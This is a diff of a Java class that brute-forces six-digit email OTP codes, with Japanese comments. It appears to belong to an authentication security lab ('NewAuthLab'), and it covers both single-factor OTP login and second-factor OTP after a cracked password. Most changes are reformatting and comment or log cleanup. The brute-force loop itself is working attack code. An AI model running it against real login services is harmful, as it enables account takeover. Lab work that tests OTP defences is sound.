@@ -35,36 +35,45 @@ public class EmailOtpBruteForceAttack {
 			String email,
 			int maxAttempts) {
 
-		if (username == null || username.isBlank()) {
+		if (username == null
+				|| username.isBlank()) {
+
 			throw new IllegalArgumentException(
 					"ユーザー名が指定されていません。");
 		}
 
-		if (email == null || email.isBlank()) {
+		if (email == null
+				|| email.isBlank()) {
+
 			throw new IllegalArgumentException(
 					"メールアドレスが指定されていません。");
 		}
 
 		if (maxAttempts <= 0) {
+
 			throw new IllegalArgumentException(
 					"最大試行回数は1以上にしてください。");
 		}
 
 		// OTPは000000～999999の6桁
 		int actualMaxAttempts =
-				Math.min(maxAttempts, 1_000_000);
+				Math.min(
+						maxAttempts,
+						1_000_000);
 
 		System.out.println(
 				"========================================");
 
 		System.out.println(
-				"実際のEmail OTP総当たりを開始");
+				"Email OTP総当たり攻撃開始");
 
 		System.out.println(
-				"username = " + username);
+				"username = "
+						+ username);
 
 		System.out.println(
-				"email = " + email);
+				"email = "
+						+ email);
 
 		System.out.println(
 				"最大試行回数 = "
@@ -75,10 +84,6 @@ public class EmailOtpBruteForceAttack {
 
 		/*
 		 * まず対象ユーザーのメールアドレスにOTPを発行する
-		 *
-		 * usernameも一緒に送信することで、
-		 * 同じメールアドレスを複数ユーザーが使用していても
-		 * 正しいユーザーを特定できるようにする。
 		 */
 		LoginResult sendOtpResult =
 				newAuthLabLoginClient.sendEmailOtp(
@@ -109,58 +114,36 @@ public class EmailOtpBruteForceAttack {
 		/*
 		 * 000000 ～ 999999 を総当たり
 		 */
-		for (int i = 0; i < 1_000_000; i++) {
+		for (int i = 0;
+				i < 1_000_000;
+				i++) {
 
 			if (attemptCount >= actualMaxAttempts) {
 				break;
 			}
 
 			String candidate =
-					String.format("%06d", i);
+					String.format(
+							"%06d",
+							i);
 
 			attemptCount++;
 
+			// OTP候補を1件ずつ表示
 			System.out.println(
-					"OTP Attempt "
+					"Email OTP総当たり 試行 "
 							+ attemptCount
-							+ " : candidate="
+							+ " / "
+							+ actualMaxAttempts
+							+ " : "
 							+ candidate);
 
-			/*
-			 * OTP検証
-			 *
-			 * verifyEmailOtp() はリダイレクトを追跡せず、
-			 * /attack-login?ticket=...
-			 * のURLを取得する。
-			 */
 			LoginResult verifyResult =
 					newAuthLabLoginClient
-					.verifyEmailOtp(candidate);
+							.verifyEmailOtp(
+									candidate);
 
-			/*
-			 * 認証成功
-			 */
 			if (verifyResult.isSuccess()) {
-
-				System.out.println(
-						"----------------------------------------");
-
-				System.out.println(
-						"OTP found!");
-
-				System.out.println(
-						"OTP = " + candidate);
-
-				System.out.println(
-						"Attempts = "
-								+ attemptCount);
-
-				System.out.println(
-						"Final URL = "
-								+ verifyResult.getFinalUrl());
-
-				System.out.println(
-						"----------------------------------------");
 
 				return new AttackResult(
 						true,
@@ -169,22 +152,6 @@ public class EmailOtpBruteForceAttack {
 						verifyResult);
 			}
 		}
-
-		/*
-		 * 最大試行回数まで実行しても突破できなかった
-		 */
-		System.out.println(
-				"----------------------------------------");
-
-		System.out.println(
-				"OTP not found.");
-
-		System.out.println(
-				"Attempts = "
-						+ attemptCount);
-
-		System.out.println(
-				"----------------------------------------");
 
 		return new AttackResult(
 				false,
@@ -203,11 +170,6 @@ public class EmailOtpBruteForceAttack {
 	 *
 	 * Password認証がすでに成功した状態から、
 	 * Email OTPを000000～999999まで総当たりする。
-	 *
-	 * @param username 対象ユーザーのユーザー名
-	 * @param password 正しいPassword
-	 * @param maxAttempts 最大OTP試行回数
-	 * @return 攻撃結果
 	 */
 	public AttackResult executeTwoFactor(
 			String username,
@@ -244,7 +206,7 @@ public class EmailOtpBruteForceAttack {
 				"========================================");
 
 		System.out.println(
-				"二要素認証 Email OTP総当たりを開始");
+				"二要素認証 Email OTP総当たり攻撃開始");
 
 		System.out.println(
 				"username = "
@@ -261,18 +223,11 @@ public class EmailOtpBruteForceAttack {
 		// Password認証
 		// =====================================================
 
-		/*
-		 * PasswordはFactorAuthenticationAttack側で
-		 * PasswordBruteForceAttackによって突破済み。
-		 *
-		 * ここでは、その正しいPasswordを使って
-		 * NewAuthLabにOTPを発行させる。
-		 */
 		LoginResult passwordResult =
 				newAuthLabLoginClient
-				.loginTwoFactorPassword(
-						username,
-						password);
+						.loginTwoFactorPassword(
+								username,
+								password);
 
 		if (!passwordResult.isRequestSuccess()) {
 
@@ -302,10 +257,9 @@ public class EmailOtpBruteForceAttack {
 
 		int attemptCount = 0;
 
-		/*
-		 * 000000 ～ 999999 を総当たり
-		 */
-		for (int i = 0; i < 1_000_000; i++) {
+		for (int i = 0;
+				i < 1_000_000;
+				i++) {
 
 			if (attemptCount >= actualMaxAttempts) {
 				break;
@@ -318,47 +272,21 @@ public class EmailOtpBruteForceAttack {
 
 			attemptCount++;
 
+			// OTP候補を1件ずつ表示
 			System.out.println(
-					"二要素OTP Attempt "
+					"二要素Email OTP総当たり 試行 "
 							+ attemptCount
-							+ " : candidate="
+							+ " / "
+							+ actualMaxAttempts
+							+ " : "
 							+ candidate);
-
-			// =================================================
-			// 二要素OTP検証
-			// =================================================
 
 			LoginResult verifyResult =
 					newAuthLabLoginClient
-					.verifyTwoFactorOtp(
-							candidate);
-
-			// =================================================
-			// 認証成功
-			// =================================================
+							.verifyTwoFactorOtp(
+									candidate);
 
 			if (verifyResult.isSuccess()) {
-
-				System.out.println(
-						"----------------------------------------");
-
-				System.out.println(
-						"二要素OTP found!");
-
-				System.out.println(
-						"OTP = "
-								+ candidate);
-
-				System.out.println(
-						"OTP Attempts = "
-								+ attemptCount);
-
-				System.out.println(
-						"Final URL = "
-								+ verifyResult.getFinalUrl());
-
-				System.out.println(
-						"----------------------------------------");
 
 				return new AttackResult(
 						true,
@@ -367,23 +295,6 @@ public class EmailOtpBruteForceAttack {
 						verifyResult);
 			}
 		}
-
-		// =====================================================
-		// OTP突破失敗
-		// =====================================================
-
-		System.out.println(
-				"----------------------------------------");
-
-		System.out.println(
-				"二要素OTP not found.");
-
-		System.out.println(
-				"OTP Attempts = "
-						+ attemptCount);
-
-		System.out.println(
-				"----------------------------------------");
 
 		return new AttackResult(
 				false,
@@ -404,13 +315,6 @@ public class EmailOtpBruteForceAttack {
 
 		private final int attemptCount;
 
-		/*
-		 * OTP認証成功時のログイン結果
-		 *
-		 * ここに
-		 * /attack-login?ticket=...
-		 * のURLを保持する
-		 */
 		private final LoginResult loginResult;
 
 		public AttackResult(
